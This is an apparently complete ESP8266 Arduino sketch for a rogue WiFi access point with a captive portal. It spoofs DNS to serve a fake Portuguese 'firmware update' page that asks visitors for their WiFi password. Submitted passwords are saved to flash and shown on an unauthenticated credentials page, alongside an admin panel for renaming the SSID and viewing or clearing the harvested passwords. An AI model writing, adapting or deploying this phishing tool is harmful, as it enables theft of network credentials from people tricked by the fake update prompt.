// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)
// LittleFS functionality by dsfifty 16 Nov 2022

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// User configuration
#define SSID_NAME "Soares"
#define SUBTITLE "Configuração de firmware"
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"
String currentSSID = SSID_NAME;

//function prototypes
void readData();
void writeData(String data);
void deleteData();

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String data = "";
String Credentials = "";
int savedData = 0;
int timer = 5000;
int i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() { return 
  "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = 
  "body { background: #f4f6f9; color: #333; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }"
  "nav { background: #0077cc; color: white; padding: 1em; font-size: 1.2em; }"
  "nav b { font-size: 1.5em; display: block; }"
  "div { padding: 1em; }"
  "h1 { font-size: 1.3em; }"
  "input[type=password] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }"
  "input[type=submit] { background-color: #0077cc; color: white; padding: 10px 20px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }"
  "input[type=submit]:hover { background-color: #005fa3; }"
  "label { font-weight: bold; display: block; margin-bottom: 8px; }"
  ".q { text-align: center; margin-top: 2em; color: #888; font-size: 0.9em; }";


  String h = "<!DOCTYPE html><html>"
    "<head><meta charset=\"UTF-8\">"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<div class='container'><h2>"+t+"</h2>";
  return h;
}


String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header("Atualização de Firmware") +
    "<div><p>Para continuar utilizando a internet, é necessário atualizar as configurações do dispositivo.</p>" 
    "<p>Insira a senha da sua rede Wi-Fi para concluir a atualização automática. Após isso, a conexão será restaurada em instantes.</p></div>"
    "<div><form action=/post method=post>" +
    "<label for=password>Senha da rede Wi-Fi:</label>" +
    "<center><input type=password name=password placeholder=\"Digite sua senha\" required></center><br>" +
    "<center><input type=submit value=\"Atualizar Agora\"></form></center>" + footer();
}


String posted() {
  String password = input("password");
  readData();  // Atualiza o conteúdo anterior
  Credentials = data + "<li>Senha Wi-Fi: <b>" + password + "</b></li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
  return header("Atualizando...") + 
    "<p>Atualizando configurações da rede...</p>" +
    "<p>Aguarde até 5 minutos. A internet será restaurada automaticamente.</p>" + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  data = "";
  savedData = 0;
  deleteData();  //deletes the file from LittleFS
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

// função do painel
String adminPanel() {
  return header("Painel Administrativo") +
    "<form action='/setssid' method='POST'>" +
    "<label for='ssid'>Nome da rede (SSID):</label>" +
    "<input type='text' name='ssid' value='" + currentSSID + "' required><br><br>" +
    "<input type='submit' value='Alterar SSID'>" +
    "</form><br>" +

    "<form action='/creds' method='GET'>" +
    "<input type='submit' value='Ver senhas'>" +
    "</form><br>" +

    "<form action='/clear' method='GET'>" +
    "<input type='submit' value='Limpar senhas'>" +
    "</form><br>" +

    "<div class=q><a href='/'>Voltar para a página inicial</a></div>" +
    footer();
}


void BLINK() {  // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    count = count + 1;
  }
}

void readData()  //reads the file from LittleFS and returns as the string variable called: data
{
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "r");
  //Check if the file exists
  if (!file) {
    return;
  }
  data = "";  //setup for data read
  int i = 0;
  char myArray[1000];
  while (file.available()) {

    myArray[i] = (file.read());  //file is read one character at a time into the char array
    i++;
  }
  myArray[i] = '\0';  //a null is added at the end
  //Close the file
  file.close();
  data = String(myArray);  //convert the array into a string ready for return
  if (data != ""){
    savedData=1;
  }
}

void writeData(String data) {
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "w");
  //Write to the file
  file.print(data);
  delay(1);
  //Close the file
  file.close();
}

void deleteData() {
  //Remove the file
  LittleFS.remove("/SavedFile.txt");
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/admin", []() {
    webServer.send(HTTP_CODE, "text/html", adminPanel());
  });
  
  webServer.on("/setssid", []() {
    currentSSID = input("ssid");
    WiFi.softAP(currentSSID);  // Atualiza nome da rede
    webServer.send(HTTP_CODE, "text/html", 
      header("SSID Atualizado") +
      "<p>SSID alterado com sucesso para: <b>" + currentSSID + "</b></p>" +
      "<p><a href='/admin'>Voltar ao painel</a></p>" + footer());
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);

  //LittleFS set up
  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
    delay(1000);
    return;
  }
  //Read the saved data every boot
  readData();

}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  Serial.println(i);
  Serial.println(savedData);
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) { i = 0; }
}